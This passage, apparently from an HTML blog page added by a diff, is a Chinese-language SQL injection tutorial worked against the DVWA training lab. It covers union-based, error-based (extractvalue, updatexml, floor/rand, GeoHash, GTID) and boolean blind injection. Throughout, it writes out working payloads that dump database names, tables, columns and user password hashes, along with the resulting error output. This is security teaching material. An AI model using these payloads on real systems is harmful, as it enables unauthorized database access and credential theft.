+          <td style="text-align: left"><strong>判断数字型</strong></td>
+          <td style="text-align: left"><code>1 and 1=1</code></td>
+          <td style="text-align: left">页面 <strong>正常</strong>，与 <code>?id=1</code> 时相同</td>
+      </tr>
+      <tr>
+          <td style="text-align: left"></td>
+          <td style="text-align: left"><code>1 and 1=2</code></td>
+          <td style="text-align: left">页面 <strong>内容异常</strong> (如变空)，但不是程序或语法报错</td>
+      </tr>
+      <tr>
+          <td style="text-align: left"><strong>判断字符型</strong></td>
+          <td style="text-align: left"><code>1' and '1'='1</code></td>
+          <td style="text-align: left">页面 <strong>正常</strong>，与 <code>?id='1'</code> 时相同</td>
+      </tr>
+      <tr>
+          <td style="text-align: left"></td>
+          <td style="text-align: left"><code>1' and '1'='2</code></td>
+          <td style="text-align: left">页面 <strong>内容异常</strong> (如变空)，但不是程序或语法报错</td>
+      </tr>
+  </tbody>
+</table></div>
+<p><strong>分别测试是否对应的结果</strong></p>
+<blockquote>
+<p><mark><strong>还有更加简单（但是不知道是否一定有效的方法）：</strong></mark></p>
+<p><strong>输入<code>2-1</code>，如果是数字型，就会执行<code>2-1</code>运算，<code>id=1</code>；如果是字符型，就会是<code>id=2</code></strong></p>
+<p><strong>可以构造一个<code>m-n</code>，<code>m</code>是不存在的<code>id</code>，但<code>m-n</code>结果是存在的<code>id</code>，依据结果来判断是字符型还是数字型</strong></p>
+<p><strong>这一点在盲注时比较方便</strong></p></blockquote>
+<p>通过以上测试，我们知道了现在DVWA的注入类型是字符型</p>
+<p><span style="color:#fab920;font-size:15px"><strong>当然，在写题的时候很有可能你一个也试不出来，因为它是被<code>('')</code>或者<code>&quot;&quot;</code>包裹的，这就需要你凭感觉试了</strong></span></p>
+<p><span style="color:#fab920;font-size:15px"><strong>不过在此之前，先检查一下你之前的语句有没有写对吧~</strong></span></p>
+<h3 id="2猜测sql查询语句中的字段数列数">2.猜测SQL查询语句中的字段数（列数）
+</h3><p><strong>从1开始，使用order by语句指定查询结果依照第n列排序，如果报错，说明不存在该行列</strong></p>
+<pre tabindex="0"><code>1&#39; or 1=1 order by 1 #   
+1&#39; or 1=1 order by 2 #  
+1&#39; or 1=1 order by 3 #      //报错了
+</code></pre><p>order by 3的时候报错，说明当前查询的表中只有2列</p>
+<blockquote>
+<p><strong><code>and</code>：如果and前为真，执行后面内容</strong></p>
+<p><strong><code>or</code>：如果前面为假，才执行后面内容</strong></p></blockquote>
+<h3 id="3确定显示的字段顺序">3.确定显示的字段顺序
+</h3><p><strong>虽然我们知道了字段数，但很可能这些字段不是都显示在网页前端的</strong></p>
+<p>假如其中某些字段的查询结果是会返回到前端的，那么我们就需要知道这些字段中哪些结果会回显，如果我们直接输入查询字段进行查询，语句会非常冗长，而且很可能还需要做很多次测试</p>
+<p><strong>这时候我们利用一个简单的语句：select 1,2,3，根据显示在页面上的数字就可以知道回显位置（sql特性）</strong></p>
+<p>之后，我们只需要把这个数字改成我们想查询的内容（如id,password），就会在窗口显示我们想要的结果</p>
+<pre tabindex="0"><code>1&#39; union select 1,2 #
+</code></pre><p><img src="http://picture.928330.xyz/typora/image-20250626115719525.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250626115719525"
+	
+	
+></p>
+<p>这样就确定了网站执行的SQL语句为：</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#c678dd">select</span> <span style="color:#e06c75">Firstname</span>,<span style="color:#e06c75">Surname</span> <span style="color:#c678dd">from</span> <span style="color:#e06c75">xx</span> <span style="color:#c678dd">where</span> <span style="color:#e06c75">ID</span><span style="color:#56b6c2">=</span><span style="color:#98c379">&#39;id&#39;</span>
+</span></span></code></pre></div><blockquote>
+<p><strong>从过程中也不难看出，其实确定字段列数和显示顺序可以一起做</strong>
+<strong>从union select 1开始，一直增加select后的位数，直到报错为止</strong></p></blockquote>
+<h3 id="4获取当前数据库">4.获取当前数据库
+</h3><p>知道了回显位，我们就可以把回显位替换成想要的数据</p>
+<p><strong><mark>这里一定要写全，有多少字段，select后面就要有多少相应的字段</mark></strong>：</p>
+<pre tabindex="0"><code>1&#39; union select 1,database() #
+</code></pre><p><strong><code>database()</code> 是mysql内置函数，当数据库执行到它时，会将其替换为当前正在使用的数据库的名称</strong></p>
+<p><img src="http://picture.928330.xyz/typora/image-20250626135800624.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250626135800624"
+	
+	
+></p>
+<p>于是，我们就知道了当前数据库名称为<code>dvwa</code></p>
+<h3 id="5获取数据库中的表">5.获取数据库中的表
+</h3><p><strong>information_schema.tables表存储了数据表的元数据信息：</strong></p>
+<div class="table-wrapper"><table>
+  <thead>
+      <tr>
+          <th>字段名 (Field Name)</th>
+          <th>描述 (Description)</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td><code>table_schema</code></td>
+          <td>记录该表所在的数据库的名称</td>
+      </tr>
+      <tr>
+          <td><code>table_name</code></td>
+          <td>记录数据表的名称</td>
+      </tr>
+      <tr>
+          <td><code>engine</code></td>
+          <td>记录该表使用的存储引擎，例如 <code>InnoDB</code>, <code>MyISAM</code></td>
+      </tr>
+      <tr>
+          <td><code>table_rows</code></td>
+          <td>关于表中总行数的一个粗略估计值</td>
+      </tr>
+      <tr>
+          <td><code>data_length</code></td>
+          <td>记录数据表本身的大小（单位：字节）</td>
+      </tr>
+      <tr>
+          <td><code>index_length</code></td>
+          <td>记录数据表索引的大小（单位：字节）</td>
+      </tr>
+      <tr>
+          <td><code>row_format</code></td>
+          <td>记录行的格式，例如 <code>Dynamic</code> 或 <code>Compressed</code>，可用于判断表是否被压缩</td>
+      </tr>
+  </tbody>
+</table></div>
+<p>我们就可以从中得到想要的信息：</p>
+<pre tabindex="0"><code>1&#39; union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #
+</code></pre><p><img src="http://picture.928330.xyz/typora/image-20250626142534142.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250626142534142"
+	
+	
+></p>
+<p>上面的语句效果等同于下面的语句，只不过使用了<code>group_concat()</code>，让输出的内容拼成了一个字符串：</p>
+<pre tabindex="0"><code>1&#39; union select 1,table_name from information_schema.tables where table_schema=&#39;dvwa&#39; #
+</code></pre><p><img src="http://picture.928330.xyz/typora/image-20250626142649062.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250626142649062"
+	
+	
+></p>
+<p>这样就知道了dvwa里面一共有两个表，分别为guestbook和users</p>
+<h3 id="6获取表中的字段名">6.获取表中的字段名
+</h3><p><strong>information_schema.columns表存储了所有表所有列的元数据信息：</strong></p>
+<div class="table-wrapper"><table>
+  <thead>
+      <tr>
+          <th style="text-align: left">字段名</th>
+          <th style="text-align: left">描述</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td style="text-align: left"><code>COLUMN_NAME</code></td>
+          <td style="text-align: left">记录列的名称</td>
+      </tr>
+      <tr>
+          <td style="text-align: left"><code>TABLE_NAME</code></td>
+          <td style="text-align: left">记录该列所属的数据表的名称</td>
+      </tr>
+      <tr>
+          <td style="text-align: left"><code>TABLE_SCHEMA</code></td>
+          <td style="text-align: left">记录该列所属的数据库的名称</td>
+      </tr>
+      <tr>
+          <td style="text-align: left"><code>ORDINAL_POSITION</code></td>
+          <td style="text-align: left">记录该列在表中的位置顺序（一个从1开始的数字）</td>
+      </tr>
+      <tr>
+          <td style="text-align: left"><code>DATA_TYPE</code></td>
+          <td style="text-align: left">记录该列的数据类型，例如 <code>varchar</code>, <code>int</code>, <code>text</code> 等</td>
+      </tr>
+      <tr>
+          <td style="text-align: left"><code>COLUMN_KEY</code></td>
+          <td style="text-align: left">记录该列是否为键（索引）。<code>PRI</code> 代表主键, <code>UNI</code> 代表唯一键, <code>MUL</code> 代表可重复的索引</td>
+      </tr>
+      <tr>
+          <td style="text-align: left"><code>COLUMN_DEFAULT</code></td>
+          <td style="text-align: left">记录该列的默认值（如果设置了）</td>
+      </tr>
+      <tr>
+          <td style="text-align: left"><code>IS_NULLABLE</code></td>
+          <td style="text-align: left">记录该列是否允许为 <code>NULL</code> 值 (<code>YES</code> 或 <code>NO</code>)。</td>
+      </tr>
+      <tr>
+          <td style="text-align: left"><code>CHARACTER_MAXIMUM_LENGTH</code></td>
+          <td style="text-align: left">记录字符串类型列的最大长度。</td>
+      </tr>
+  </tbody>
+</table></div>
+<p>同样借此获取users表的字段：</p>
+<pre tabindex="0"><code>1&#39; union select 1,group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39; #
+</code></pre><p><img src="http://picture.928330.xyz/typora/image-20250626144509634.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250626144509634"
+	
+	
+></p>
+<p>这样就得到了users表的所有的列名称</p>
+<h3 id="7获取字段信息">7.获取字段信息
+</h3><p><strong>知道了表名和列名，就能轻松获取对应信息了</strong></p>
+<p>比如我想获取所有用户的id名称和对应密码：</p>
+<pre tabindex="0"><code>1&#39; union select group_concat(user_id,first_name),group_concat(password) from users #
+</code></pre><p><img src="http://picture.928330.xyz/typora/image-20250626145455797.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250626145455797"
+	
+	
+></p>
+<p>我们在这里使用group_concat拼接了两组字符串，因为select输出的数量必须与字段数一致，这里是2</p>
+<h3 id="8逐行获取信息">8.逐行获取信息
+</h3><p><strong>书接上文，如果我只想要显示某一条信息，就可以在末尾加上<code>limit m,n</code></strong></p>
+<p><strong>意思是从第m条数据开始，显示包括n条数据，比如<code>limit 0,1</code>，就是只显示第1条数据（数据从0开始存储）</strong></p>
+<pre tabindex="0"><code>1&#39; union select 1,group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39; limit 1,1 #
+</code></pre><p><img src="http://picture.928330.xyz/typora/image-20250627113327247.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250627113327247"
+	
+	
+></p>
+<p>这里使用<code>limit1,1</code>，就只显示了第二条数据</p>
+<h2 id="2-报错注入">#2 报错注入
+</h2><p>如果union被过滤，或者页面没有回显但SQL语句执行可以输出错误信息，就可以使用基于报错的注入攻击</p>
+<p>报错注入就是人为制造错误条件，让查询结果在报错信息中被“带出”</p>
+<p><strong><mark>报错注入最好使用and，因为我们的目的是保证语句执行错误，产生错误信息</mark></strong></p>
+<h3 id="常用函数-1">常用函数
+</h3><p>在mysql高版本**（大于5.1版本）**中添加了对XML文档进行查询和修改的函数<code>updatexml()</code>和<code>extractvalue()</code></p>
+<p>当这两个函数在执行时，如果出现xml文档路径错误就会产生报错</p>
+<h4 id="extractvalue-xml_document-xpath_string">extractvalue (XML_document, XPath_string)
+</h4><ul>
+<li>
+<p>第一个参数：<code>XML_document</code> 是目标XML文档</p>
+</li>
+<li>
+<p>第二个参数：<code>XPath_string</code> <strong>是该XML文档的路径，如果写入其他格式就会报错，并且返回非法格式的内容</strong></p>
+</li>
+</ul>
+<p><mark><strong>我们可以利用concat拼接任意非法字符和查询语句/函数，这样想要得到的内容就会随着报错一并回显：</strong></mark></p>
+<pre tabindex="0"><code>1&#39; and (extractvalue(1,concat(0x7e,(select database()),0x7e)))#
+</code></pre><p>0x7e是~的十六进制，而~不属于xpath语法格式，因此会报出xpath语法错误：</p>
+<pre tabindex="0"><code>XPATH syntax error: &#39;~dvwa~&#39;
+</code></pre><p><strong>我们使用了<code>database()</code>函数，而sql会执行这个函数，返回函数结果，就带出了数据库名称</strong></p>
+<h4 id="updatexml-xml_document-xpath_string-new_value">updatexml (XML_document, XPath_string, new_value)
+</h4><ul>
+<li>第一个参数：<code>XML_document</code> 是目标XML文档</li>
+<li>第二个参数：<code>XPath_string</code> <strong>是该XML文档的路径，如果写入其他格式就会报错，并且返回非法格式的内容</strong></li>
+<li>第三个参数：<code>new_value</code> 用来替换查找到的符合条件的数据</li>
+</ul>
+<pre tabindex="0"><code>1&#39; and updatexml(1,concat(0x7e,(select database()),0x7e),3)#
+</code></pre><p>也是同理会报错</p>
+<p><span style="color:#fab920;font-size:20px"><strong>之后的演示我会以<code>updatexml()</code>和<code>extractvalue()</code>为主</strong></span></p>
+<p><span style="color:#fab920;font-size:20px"><strong>但在此之前，我还想介绍一些其他的好玩的函数(当然也很有用!）👇</strong></span></p>
+<h3 id="不那么常用的函数">不那么常用的函数
+</h3><h4 id="floor函数8xmysql50">floor函数(8.x&gt;mysql&gt;5.0）
+</h4><p><strong><code>floor()</code>：对结果取整（向下舍入）</strong></p>
+<p>这不是一个单独使用的函数，而是需要与<code>rand()</code>, <code>count(*)</code>和<code>group by</code>结合使用，来触发<strong>主键重复错误</strong>：</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span>(<span style="color:#c678dd">select</span> <span style="color:#d19a66">1</span> <span style="color:#c678dd">from</span> 
+</span></span><span style="display:flex;"><span>(<span style="color:#c678dd">select</span> <span style="color:#c678dd">count</span>(<span style="color:#56b6c2">*</span>),<span style="color:#e06c75">concat</span>((<span style="color:#c678dd">select</span> <span style="color:#c678dd">database</span>()),<span style="color:#e06c75">floor</span>(<span style="color:#e06c75">rand</span>(<span style="color:#d19a66">0</span>)<span style="color:#56b6c2">*</span><span style="color:#d19a66">2</span>))<span style="color:#e06c75">x</span> <span style="color:#c678dd">from</span> <span style="color:#e06c75">information_schema</span>.<span style="color:#e06c75">tables</span> <span style="color:#c678dd">group</span> <span style="color:#c678dd">by</span> <span style="color:#e06c75">x</span>)<span style="color:#e06c75">a</span>)
+</span></span><span style="display:flex;"><span>								      ↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑
+</span></span><span style="display:flex;"><span>	这里插入你想进行的查询语句，只能有一个返回值，因为<span style="color:#e06c75">concat函数值只接受单值</span>，最好使用<span style="color:#e06c75">limit语句</span>，比如：
+</span></span><span style="display:flex;"><span>	
+</span></span><span style="display:flex;"><span>(<span style="color:#c678dd">select</span> <span style="color:#d19a66">1</span> <span style="color:#c678dd">from</span> 
+</span></span><span style="display:flex;"><span>(<span style="color:#c678dd">select</span> <span style="color:#c678dd">count</span>(<span style="color:#56b6c2">*</span>),<span style="color:#e06c75">concat</span>((<span style="color:#c678dd">select</span> <span style="color:#c678dd">table_name</span> <span style="color:#c678dd">from</span> <span style="color:#e06c75">information_schema</span>.<span style="color:#e06c75">tables</span> <span style="color:#c678dd">where</span> <span style="color:#e06c75">table_schema</span><span style="color:#56b6c2">=</span><span style="color:#98c379">&#39;dvwa&#39;</span> <span style="color:#c678dd">limit</span> <span style="color:#d19a66">0</span>,<span style="color:#d19a66">1</span>),<span style="color:#e06c75">floor</span>(<span style="color:#e06c75">rand</span>(<span style="color:#d19a66">0</span>)<span style="color:#56b6c2">*</span><span style="color:#d19a66">2</span>))<span style="color:#e06c75">x</span> <span style="color:#c678dd">from</span> <span style="color:#e06c75">information_schema</span>.<span style="color:#e06c75">tables</span> <span style="color:#c678dd">group</span> <span style="color:#c678dd">by</span> <span style="color:#e06c75">x</span>)<span style="color:#e06c75">a</span>)
+</span></span></code></pre></div><p>现在，我们输入这样的注入语句：</p>
+<pre tabindex="0"><code>1&#39; and (select 1 from (select count(*),concat((select database()),floor(rand(0)*2))x from information_schema.tables group by x)a)#
+</code></pre><p>我们看看每一个部分的作用：</p>
+<ul>
+<li>
+<p><strong><code>floor(rand(0)\*2)</code></strong></p>
+<p><code>rand()</code>函数会产生一个0到1之间的随机数。但当给它一个固定的种子（seed），如<code>0</code>时，它产生的“随机数”序列就变成<strong>完全可预测</strong>的了</p>
+<p>最终，<strong><code>floor(rand(0)*2)</code>会稳定地产生这样一个序列：<code>0, 1, 1, 0, 1, 1, 0, ...</code></strong></p>
+</li>
+<li>
+<p><strong><code>concat((select database()), floor(rand(0)\*2))</code></strong></p>
+<p>这部分将我们要查询的数据与上面产生的<code>0</code>或<code>1</code>拼接起来</p>
+<p>因此，它会生成一系列的字符串，如 <code>'dvwa0'</code>, <code>'dvwa1'</code>, <code>'dvwa1'</code>, <code>'dvwa0'</code></p>
+</li>
+<li>
+<p><strong><code>... from information_schema.tables group by x</code></strong></p>
+<p><code>from information_schema.tables</code>：这里只是为了提供足够的数据行（至少3行）来让<code>group by</code>操作得以触发错误，<strong>任何行数足够的表都可以</strong>。</p>
+<p><code>group by x</code>：这是触发错误的关键，它会根据我们上面生成的字符串（如<code>'dvwa0'</code>, <code>'dvwa1'</code>）进行分组和计数。</p>
+</li>
+<li>
+<p><strong><code>select 1 from ...</code></strong></p>
+<p>把返回两列的内部查询包装成只返回一列（内容是<code>1</code>）的、语法正确的子查询</p>
+</li>
+</ul>
+<p>接下来，我们需要知道两个关键点：</p>
+<p><mark><strong>1.group by在执行时，会建立一个虚拟的临时表，用于存放分组的键(key)和count(*)计数值</strong></mark></p>
+<p><mark><strong>2.在执行插入操作前，sql会再次查询当前要插入的键，因此rand()会再次执行</strong></mark></p>
+<p>现在来看看错误是怎样发生的：</p>
+<ul>
+<li>
+<p><strong>逐行处理</strong>：</p>
+<p>第一行：调用<code>rand()</code>，计算出的键是<code>'dvwa0'</code>，临时表中没有这个键，sql准备插入，此时第二次调用<code>rand()</code>，计算出<code>'dvwa1'</code>插入</p>
+<p><strong>（也就是说，想插入的是0，却插入了1）</strong></p>
+<p>第二行：此时<code>rand()</code>第三次被调用，计算出的键是<code>'dvwa1'</code>，临时表中已经有了，不用插入，计数值加一就行</p>
+<p><strong>（注意：sql这里一开始就没有打算插入，而是选择count+1）</strong></p>
+</li>
+<li>
+<p><strong>触发错误</strong>：</p>
+<p>第三行：此时<code>rand()</code>第四次被调用，计算出的键是<code>'dvwa0'</code>，表里没有这个键，所以sql准备插入，此时第五次调用<code>rand()</code>，计算出<code>'dvwa1'</code>插入</p>
+<p>等等，不对！表里已经有<code>'dvwa1'</code>了！</p>
+<p>这就导致sql尝试插入一个已经存在的键，从而触发了**“主键重复”（<code>Duplicate entry</code>）的错误：**</p>
+<pre tabindex="0"><code>Duplicate entry &#39;dvwa1&#39; for key &#39;group_key&#39;
+</code></pre></li>
+</ul>
+<p><strong>这样，就把数据库名称带了出来</strong></p>
+<p><strong>同时，我们还能总结出这样的规律：</strong></p>
+<p><span style="color:red;font-size:20px"><strong>对于一个整数x通过floor(rand(x)*2)产生的序列：</strong></span></p>
+<p><span style="color:red;font-size:20px"><strong>如果在未出现<code>0011</code>或<code>1100</code>序列前出现<code>0010</code>或<code>1101</code>，那么该序列可用于报错型sql盲注</strong></span></p>
+<p>参考文档：<a class="link" href="https://blog.csdn.net/qq_35544379/article/details/77453019"  target="_blank" rel="noopener"
+    >SQL报错型盲注教程
+    
+    <span style="white-space: nowrap;"><svg width=".7em"
+        height=".7em" viewBox="0 0 21 21" xmlns="http://www.w3.org/2000/svg">
+        <path d="m13 3l3.293 3.293l-7 7l1.414 1.414l7-7L21 11V3z" fill="currentColor" />
+        <path d="M19 19H5V5h7l-2-2H5c-1.103 0-2 .897-2 2v14c0 1.103.897 2 2 2h14c1.103 0 2-.897 2-2v-5l-2-2v7z"
+            fill="currentColor">
+    </svg></span>
+    
+</a></p>
+<p>​		<a class="link" href="https://www.secpulse.com/archives/140616.html"  target="_blank" rel="noopener"
+    >关于floor()报错注入，你真的懂了吗？
+    
+    <span style="white-space: nowrap;"><svg width=".7em"
+        height=".7em" viewBox="0 0 21 21" xmlns="http://www.w3.org/2000/svg">
+        <path d="m13 3l3.293 3.293l-7 7l1.414 1.414l7-7L21 11V3z" fill="currentColor" />
+        <path d="M19 19H5V5h7l-2-2H5c-1.103 0-2 .897-2 2v14c0 1.103.897 2 2 2h14c1.103 0 2-.897 2-2v-5l-2-2v7z"
+            fill="currentColor">
+    </svg></span>
+    
+</a></p>
+<h4 id="st_latfromgeohashgeohash_string">ST_LatFromGeoHash(geohash_string)
+</h4><p><strong>参数是一个GeoHash格式的字符串，如果格式不对，函数就会报错，并可能返回导致错误的非法字符串</strong></p>
+<pre tabindex="0"><code>1&#39; and ST_LatFromGeoHash(concat(0x7e,(select user()),0x7e))#
+</code></pre><p>和XPath_string一样，<code>~</code>不是GeoHash格式里面的合法字符，如果使用就会报错，同时带出数据：</p>
+<pre tabindex="0"><code>FUNCTION dvwa.ST_LatFromGeoHash does not exist
+		           ↑↑↑↑↑
+</code></pre><h4 id="st_longfromgeohashgeohash_string">ST_LongFromGeoHash(geohash_string)
+</h4><p><strong>利用原理与<code>ST_LatFromGeoHash</code>完全相同</strong></p>
+<h4 id="st_pointfromgeohashgeohash_string-srid">ST_PointFromGeoHash(geohash_string, srid)
+</h4><p><strong>好吧和上面还是一样的</strong></p>
+<h4 id="gtid_subsetsubset-set">GTID_SUBSET(subset, set)
+</h4><ul>
+<li>
+<p>第一个参数： <code>subset</code>一个GTID（全局事务标识符）集合。</p>
+</li>
+<li>
+<p>第二个参数： <code>set</code>另一个GTID集合。</p>
+</li>
+</ul>
+<p>一个合法的GTID单元由两部分组成，用冒号隔开：<code>source_id:transaction_id</code></p>
+<p><strong>当任意一个参数不是合法的GTID集合格式时，函数就会报错，并可能返回非法参数的内容</strong></p>
+<pre tabindex="0"><code>1&#39; and GTID_SUBSET(database(), 1)#
+</code></pre><p>报错结果：</p>
+<pre tabindex="0"><code>FUNCTION dvwa.GTID_SUBSET does not exist
+</code></pre><p><span style="color:#fab920;font-size:20px"><strong>好啦，函数介绍就到此为止，下面我们正式开始报错注入的步骤！</strong></span></p>
+<h3 id="爆破数据库名称">爆破数据库名称
+</h3><pre tabindex="0"><code>1&#39; and extractvalue(1,concat(0x7e,database(),0x7e)) #
+
+1&#39; and updatexml(1,concat(0x7e,database(),0x7e),1) #
+</code></pre><p>出现下面报错：</p>
+<pre tabindex="0"><code>XPATH syntax error: &#39;~dvwa~&#39;
+</code></pre><p>这就得到了数据库的名称：dvwa</p>
+<p>可能你会有疑惑，为什么要用<code>~</code>包裹内容呢？</p>
+<p>这一方面是方便我们看返回的结果，另一方面嘛，我们接着往下看</p>
+<h3 id="爆破表名">爆破表名
+</h3><p>由于 extractvalue() 最大返回长度为 32 ，所以最好用 limit N,1 一行一行的进行回显</p>
+<pre tabindex="0"><code>1&#39; and extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=&#39;dvwa&#39; limit 0,1),0x7e)) #
+
+1&#39; and extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=&#39;dvwa&#39; limit 1,1),0x7e)) #
+</code></pre><p>分别出现下面报错：</p>
+<pre tabindex="0"><code>XPATH syntax error: &#39;~guestbook~&#39;
+
+XPATH syntax error: &#39;~users~&#39;
+</code></pre><p>而如果不用limit语句，则会出现下面的报错：</p>
+<pre tabindex="0"><code>Subquery returns more than 1 row
+</code></pre><p><strong>这不是我们想要的，所以limit语句很重要！</strong></p>
+<h3 id="爆破列名">爆破列名
+</h3><pre tabindex="0"><code>1&#39; and extractvalue(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&#39;users&#39; limit 3,1),0x7e)) #
+
+1&#39; and extractvalue(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&#39;users&#39; limit 4,1),0x7e)) #
+</code></pre><p>分别出现下面报错：</p>
+<pre tabindex="0"><code>XPATH syntax error: &#39;~user~&#39;
+
+XPATH syntax error: &#39;~password~&#39;
+</code></pre><h3 id="爆破字段内容">爆破字段内容
+</h3><pre tabindex="0"><code>1&#39; and extractvalue(1,concat(0x7e,(select concat_ws(&#39;,&#39;,user,password) from users limit 0,1),0x7e)) #
+</code></pre><p>出现下面的报错：</p>
+<pre tabindex="0"><code>XPATH syntax error: &#39;~admin,5f4dcc3b5aa765d61d8327deb&#39;
+</code></pre><p>这里我们使用了<code>concat_ws</code>函数，指定把<code>user</code>和<code>password</code>字段使用<code>,</code>拼接再返回，这样就能实现查询多列</p>
+<p>如果不使用，就会出现下面的报错：</p>
+<pre tabindex="0"><code>Operand should contain 1 column(s)
+</code></pre><p>然而，正如上面所说，<code>extractvalue()</code> 函数最大返回32个字符，所以现在得到的并非完整的信息，这一点我们也能从结果末尾没有<code>~</code>看出来**（所以两边都加<code>~</code>是比较明智的选择）**</p>
+<p>所以，我们要适当舍弃一些东西，比如把admin单独拿出来，或者使用**<code>substring()</code>函数**</p>
+<blockquote>
+<p><strong><code>substring(strings,m,n)</code>：从strings的第m个字符开始，向后截取n个字符。</strong>
+<strong><mark>注意</mark>：1.<code>substring()</code>的开始位置为1，和<code>limit</code>不一样！</strong>
+<strong>2.通常<code>substr()</code>可以代替它，用法也相同；而<code>mid()</code>总是可以代替它，因为就是它的别名</strong>
+<strong><mark>substr()=substring()=mid()</mark></strong></p></blockquote>
+<pre tabindex="0"><code>1&#39; and extractvalue(1,concat(0x7e,(select substring(concat_ws(&#39;,&#39;,user,password), 1, 30) from users limit 0,1),0x7e)) #
+
+1&#39; and extractvalue(1,concat(0x7e,(select substring(concat_ws(&#39;,&#39;,user,password), 31, 30) from users limit 0,1),0x7e)) #
+</code></pre><p>分别得到下面的报错：</p>
+<pre tabindex="0"><code>XPATH syntax error: &#39;~admin,5f4dcc3b5aa765d61d8327de~&#39;
+
+XPATH syntax error: &#39;~b882cf99~&#39;
+</code></pre><p>拼接得到完整的用户名和密码：</p>
+<pre tabindex="0"><code>admin,5f4dcc3b5aa765d61d8327deb882cf99
+</code></pre><p><strong>利用<code>substring()</code>，即使字段长度远远大于32，我们也能一点点凑出完整的内容</strong></p>
+<h2 id="3-盲注">#3 盲注
+</h2><p><strong>有的时候存在注入点，但是前端并不会回显注入结果，这就需要用特殊方式判断我们是否注入成功</strong></p>
+<h3 id="常用函数-2">常用函数
+</h3><div class="table-wrapper"><table>
+  <thead>
+      <tr>
+          <th style="text-align: center">函数</th>
+          <th style="text-align: center">用法</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td style="text-align: center">mid/substr/substring(string, m, n)</td>
+          <td style="text-align: center">从 m 位置截取string字符串 n 位，初始位置为1，n 可省略</td>
+      </tr>
+      <tr>
+          <td style="text-align: center">length(string)</td>
+          <td style="text-align: center">返回字符串长度</td>
+      </tr>
+      <tr>
+          <td style="text-align: center">ord(string)</td>
+          <td style="text-align: center">返回 string 最左面字符的 ASCII 码值</td>
+      </tr>
+      <tr>
+          <td style="text-align: center">left(string, len)</td>
+          <td style="text-align: center">从左截取 string 的前 len 位</td>
+      </tr>
+      <tr>
+          <td style="text-align: center">ascii()</td>
+          <td style="text-align: center">将某个字符转换为 ASCII 码值</td>
+      </tr>
+      <tr>
+          <td style="text-align: center">if(exp1, exp2, exp3)</td>
+          <td style="text-align: center">如果 exp1 正确，就执行 exp2 ，否则执行 exp3</td>
+      </tr>
+      <tr>
+          <td style="text-align: center">sleep(time)</td>
+          <td style="text-align: center">休眠多少秒</td>
+      </tr>
+  </tbody>
+</table></div>
+<h3 id="布尔盲注">布尔盲注
+</h3><p>当我们查询的数据在数据库存在时，就会返回：</p>
+<pre tabindex="0"><code>User ID exists in the database
+</code></pre><p>反之，则会返回：</p>
+<pre tabindex="0"><code>User ID is MISSING from the database
+</code></pre><p>我们可以构造一些判别式，观察页面返回值，来判断输入的语句是否为真</p>
+<h4 id="猜测长度">猜测长度
+</h4><p><strong>使用与(and)：</strong></p>
+<pre tabindex="0"><code>1&#39; and length(database())=4 #
+</code></pre><p><strong>使用或(or)：</strong></p>
+<pre tabindex="0"><code>&#39; or length(database())=4 #
+</code></pre><p>页面返回exists，说明数据库名称长度为4</p>
+<p>如果库名实在长，也可以使用<strong>二分法</strong>：</p>
+<pre tabindex="0"><code>1&#39; and length(database())&gt;4 #
+</code></pre><h4 id="猜测库名">猜测库名
+</h4><pre tabindex="0"><code>1&#39; and substring(database(),1,1)=&#39;d&#39; #
+</code></pre><p>如果不想使用<code>''</code>包裹字母，也可以转换成ascii码：</p>
+<pre tabindex="0"><code>1&#39; and ascii(substr(database(),1,1))=100 #
+</code></pre><p>一步步尝试，直到尝试出完整的数据库名称</p>
+<p>当然，我们在知道ascii码表的情况下，使用二分法更快：</p>
+<pre tabindex="0"><code>1&#39; and ascii(substr(database(),1,1))&gt;64 #
+</code></pre><p>如果substring被过滤了：<a class="link" href="#reverse&#43;left%e4%bb%a3%e6%9b%bfsubstring" >reverse+left代替substring
+    
+</a></p>
+<p>​				       <a class="link" href="#trim%e4%bb%a3%e6%9b%bfsubstring" >trim代替substring
+    
+</a></p>
+<p>附上一张ascii码表：</p>
+<p><img src="http://picture.928330.xyz/typora/ascii-1-1.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="ASCII 表| 菜鸟教程"
+	
+	
+></p>
+<h4 id="猜测表的数量">猜测表的数量
+</h4><pre tabindex="0"><code>1&#39; and (select count(table_name) from information_schema.tables where table_schema=&#39;dvwa&#39;)=2 #
+</code></pre><h4 id="猜测表2的长度">猜测表2的长度
+</h4><pre tabindex="0"><code>1&#39; and length((select table_name from information_schema.tables where table_schema=&#39;dvwa&#39; limit 1,1))=5#
+</code></pre><p>或者把length放在select后面：</p>
+<pre tabindex="0"><code>1&#39; and (select length(table_name) from information_schema.tables where table_schema=&#39;dvwa&#39; limit 1,1)=5#
+</code></pre><p><span style="color:red;font-size:20px"><strong>猜测表名，字段名等等的步骤都大同小异，在此不过多赘述</strong></span></p>
+<h3 id="时间盲注">时间盲注
+</h3><p>如果页面连exists这样的返回字样都没有怎么办？</p>
+<p>那么，我们就要寻找新的特征，来指示我们语句成功执行了——那就是时间</p>
+<h4 id="sleep延时">sleep延时
+</h4><p><mark><strong>利用if函数和sleep函数，如果语句成功执行，就让页面延时一段时间：</strong></mark></p>
